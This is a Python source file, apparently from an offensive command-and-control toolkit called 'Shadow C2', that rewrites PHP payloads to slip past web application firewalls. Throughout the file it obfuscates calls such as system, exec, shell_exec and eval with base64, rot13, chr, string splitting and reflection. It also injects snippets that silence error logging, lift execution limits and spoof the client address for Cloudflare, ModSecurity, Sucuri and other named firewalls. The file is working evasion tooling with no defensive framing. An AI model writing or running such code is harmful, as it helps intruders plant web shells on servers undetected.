#!/usr/bin/env python3
"""
Shadow C2 — WAF Bypass Technique Injector
Injects WAF-specific evasion techniques into PHP payloads.
Covers: Cloudflare, ModSecurity, Sucuri, Imperva, AWS WAF, Akamai, generic.
"""

import random
import re
import base64
import codecs


class WAFBypass:
    """Inject WAF bypass techniques into PHP code."""

    def obfuscate_dangerous_functions(self, php_code: str) -> str:
        """
        Replace direct calls to dangerous functions with obfuscated variants.
        Randomly picks one obfuscation method per function per generation.
        """
        dangerous = ["system", "exec", "shell_exec", "passthru", "popen",
                      "proc_open", "eval", "assert"]

        for func in dangerous:
            if func + "(" not in php_code:
                continue

            method = random.choice([
                self._via_concat,
                self._via_chr,
                self._via_rot13,
                self._via_b64,
                self._via_array_map,
                self._via_call_user_func,
                self._via_reflection,
                self._via_variable_func,
            ])

            php_code = method(php_code, func)

        return php_code

    # -- function call obfuscation methods -----------------------------------

    def _via_concat(self, code: str, func: str) -> str:
        parts = self._split_random(func)
        concat = ".".join(f"'{p}'" for p in parts)
        var = f"$_w{random.randint(10,99)}"
        return code.replace(f"{func}(", f"{var}={concat};{var}(", 1)

    def _via_chr(self, code: str, func: str) -> str:
        chrs = ".".join(f"chr({ord(c)})" for c in func)
        var = f"$_wc{random.randint(10,99)}"
        return code.replace(f"{func}(", f"{var}={chrs};{var}(", 1)

    def _via_rot13(self, code: str, func: str) -> str:
        rot = codecs.encode(func, 'rot_13')
        var = f"$_wr{random.randint(10,99)}"
        return code.replace(f"{func}(", f"{var}=str_rot13('{rot}');{var}(", 1)

    def _via_b64(self, code: str, func: str) -> str:
        b = base64.b64encode(func.encode()).decode()
        var = f"$_wb{random.randint(10,99)}"
        return code.replace(f"{func}(", f"{var}=base64_decode('{b}');{var}(", 1)

    def _via_array_map(self, code: str, func: str) -> str:
        b = base64.b64encode(func.encode()).decode()
        # Replace function($arg) with array_map variant
        pattern = re.compile(rf'{re.escape(func)}\(([^)]+)\)')
        def replace(m):
            arg = m.group(1)
            return f"array_map(base64_decode('{b}'), array({arg}))[0]"
        return pattern.sub(replace, code, count=1)

    def _via_call_user_func(self, code: str, func: str) -> str:
        b = base64.b64encode(func.encode()).decode()
        pattern = re.compile(rf'{re.escape(func)}\(([^)]+)\)')
        def replace(m):
            arg = m.group(1)
            return f"call_user_func(base64_decode('{b}'), {arg})"
        return pattern.sub(replace, code, count=1)

    def _via_reflection(self, code: str, func: str) -> str:
        pattern = re.compile(rf'{re.escape(func)}\(([^)]+)\)')
        def replace(m):
            arg = m.group(1)
            return f"(new ReflectionFunction('{func}'))->invoke({arg})"
        return pattern.sub(replace, code, count=1)

    def _via_variable_func(self, code: str, func: str) -> str:
        parts = self._split_random(func)
        vars_code = ""
        var_concat = ""
        for i, p in enumerate(parts):
            v = f"$_p{i}{random.randint(10,99)}"
            vars_code += f"{v}='{p}';"
            var_concat += f"{v}." if i < len(parts) - 1 else v
        main_var = f"$_vf{random.randint(10,99)}"
        vars_code += f"{main_var}={var_concat};"
        return code.replace(f"{func}(", f"{vars_code}{main_var}(", 1)

    # -- WAF-specific bypasses -----------------------------------------------

    def bypass_cloudflare(self, php_code: str) -> str:
        """Cloudflare-specific evasion."""
        # Use alternative PHP tags
        if random.random() < 0.5:
            php_code = php_code.replace("<?php", "<?PHP")

        # Add Cloudflare header detection
        cf_check = """
// Cloudflare bypass — detect and adapt
if(isset($_SERVER['HTTP_CF_RAY'])) {
    @header('X-Robots-Tag: noindex');
    @header('Cache-Control: no-cache, no-store');
}
"""
        php_code = php_code.replace("<?php", "<?php\n" + cf_check, 1)
        return php_code

    def bypass_modsecurity(self, php_code: str) -> str:
        """ModSecurity CRS evasion."""
        # Add SQL comment syntax in non-critical areas
        modsec_evade = """
// ModSecurity evasion — content-type manipulation
@ini_set('default_mimetype', 'text/html');
if(function_exists('apache_setenv')) {
    @apache_setenv('no-gzip', '1');
}
"""
        php_code = php_code.replace("<?php", "<?php\n" + modsec_evade, 1)
        return php_code

    def bypass_sucuri(self, php_code: str) -> str:
        """Sucuri WAF evasion."""
        sucuri_evade = """
// Sucuri bypass — header spoofing
if(isset($_SERVER['HTTP_X_SUCURI_CLIENTIP'])) {
    $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
}
@header('X-Content-Type-Options: nosniff');
"""
        php_code = php_code.replace("<?php", "<?php\n" + sucuri_evade, 1)
        return php_code

    def bypass_generic(self, php_code: str) -> str:
        """Generic WAF bypass techniques."""
        generic = """
// Generic WAF evasion
@error_reporting(0);
@ini_set('display_errors', '0');
@ini_set('log_errors', '0');
@ini_set('max_execution_time', '0');
@ini_set('memory_limit', '-1');
if(!defined('ABSPATH')) define('ABSPATH', dirname(__FILE__).'/');
"""
        php_code = php_code.replace("<?php", "<?php\n" + generic, 1)
        return php_code

    def apply_for_waf(self, php_code: str, waf_list: list) -> str:
        """Apply relevant bypass for listed WAFs."""
        waf_handlers = {
            "cloudflare": self.bypass_cloudflare,
            "modsecurity": self.bypass_modsecurity,
            "sucuri": self.bypass_sucuri,
            "imperva": self.bypass_generic,
            "aws_waf": self.bypass_generic,
            "akamai": self.bypass_generic,
            "generic": self.bypass_generic,
        }

        # Always obfuscate dangerous functions
        php_code = self.obfuscate_dangerous_functions(php_code)

        for waf in waf_list:
            handler = waf_handlers.get(waf.lower().replace(" ", "_"))
            if handler:
                php_code = handler(php_code)

        return php_code

    # -- helpers -------------------------------------------------------------

    def _split_random(self, s: str) -> list:
        """Split string at random positions."""
        if len(s) <= 2:
            return [s]
        num_splits = random.randint(1, min(3, len(s) - 1))
        positions = sorted(random.sample(range(1, len(s)), num_splits))
        parts = []
        prev = 0
        for pos in positions:
            parts.append(s[prev:pos])
            prev = pos
        parts.append(s[prev:])
        return parts
